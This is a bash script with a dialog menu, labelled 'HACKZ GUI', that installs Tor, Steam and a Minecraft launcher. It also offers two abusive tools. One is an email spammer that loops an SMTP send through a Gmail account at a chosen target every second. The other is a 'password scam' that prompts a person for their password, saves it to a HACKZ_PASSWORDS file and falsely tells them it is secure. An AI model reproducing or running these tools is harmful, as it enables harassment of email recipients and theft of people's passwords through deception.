#! /bin/bash

clear

sudo apt-get install dialog

clear

dialog --msgbox "HACKZ GUI. MADE BY HACKERS300112 - iwasneverhere101 - AvexProducts. Press ENTER to continue" 10 40

enter=$?

if [ "$enter" -eq 0 ]; then
        while true; do

                choices=$(dialog --menu "Select what you would like to install: " 20 90 9 \
                        1 "Install tor" \
                        2 "Install steam" \
                        3 "Install minecraft" \
                        4 "Update your local package index" \
                        5 "Upgrade your packages to the latest version in your local package index" \
                        6 "Email Spammer" \
                        7 "Password Scam - Potentionally Grab Someones Password" \
                        2>&1 >/dev/tty 
        )
                exit_status=$?

                if [ "$exit_status" -ne 0 ]; then
                        dialog --msgbox "Goodbye. " 10 40
                        clear
                        exit
                fi

                case $choices in
                        1) 
                                sudo echo "deb http://ftp.debian.org/debian bookworm main contrib" > /etc/apt/sources.list.d/cros.list
                                sudo echo "deb-src http://ftp.debian.org/debian bookworm main contrib" >> /etc/apt/sources.list.d/cros.list
                                sudo apt-get update
                                sudo apt-get upgrade
                                sudo apt-get install torbrowser-launcher
                                dialog --msgbox "Tor Browser has been installed. " 10 40
                                ;;
                        2)
                                sudo apt-get update && sudo apt-get upgrade
                                sudo apt-get install flatpak
                                sudo apt-get install xorg
                                sudo wget https://dl.flathub.org/repo/appstream/com.valvesoftware.Steam.flatpakref
                                sudo flatpak install com.valvesoftware.Steam.flatpakref
                                ;;
                        3)
                                sudo apt-get install openjdk-17-jdk
                                dialog --msgbox "To later run minecraft, go to this directory and type: sudo java -jar SKlauncher-3.2.10.jar" 10 40
                                java -jar Sklauncher-3.2.10.jar
                                dialog --msgbox "If any error occured, it is likely blocked, although few know about it" 10 40
                                ;;
                        4)
                                sudo apt-get update
                                ;;
                        5)
                                sudo apt-get upgrade
                                ;;
                        6)
                                dialog --msgbox "MAKE SURE YOUR ACCOUNT HAS LESS-SECURE APPS TURNED ON (JUST A WARNING)" 10 40
                                emailofspammer=$(dialog --inputbox "Enter the email you want to spam with: " 10 40 2>&1>/dev/tty)
                                passwordofspammer=$(dialog --passwordbox "Enter the password of this spammer email (for logging in and spamming): " 10 40 2>&1>/dev/tty)
                                emailbeingspammed=$(dialog --inputbox "Enter the email of the person being spammed" 10 40 2>&1>/dev/tty)
                                messagesending=$(dialog --inputbox "Enter the message you want to spam: " 10 40 2>&1>/dev/tty)
                                while true; do
                                        echo "SPAMMING"

                                        python3 - <<EOF

import smtplib

from email.mime.text import MIMEText

msg=MIMEText('$messagesending')

msg['From'] = '$emailofspammer'
msg['To'] = '$emailbeingspammed'

with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.starttls()
        smtp.login('$emailofspammer', '$passwordofspammer')
        smtp.send_message(msg)
EOF

                                        sleep 1
                                done
                                ;;
                        7)
                                dialog --msgbox "The password scam will work by asking the user to enter their password. It will then store it in a file named: HACKZ_PASSWORDS and tell the user their password is secure (a lie)" 10 40
                                password=$(dialog --passwordbox "Enter the password to see if it is secure: " 10 40 2>&1>/dev/tty)
                                echo "$password" >> HACKZ_PASSWORDS
                                dialog --msgbox "You password is secure" 10 40
                                ;; 
                esac
        done


else
        dialog --msgbox "ERROR. PLEASE RESTART THE PROGRAM" 10 40
        exit
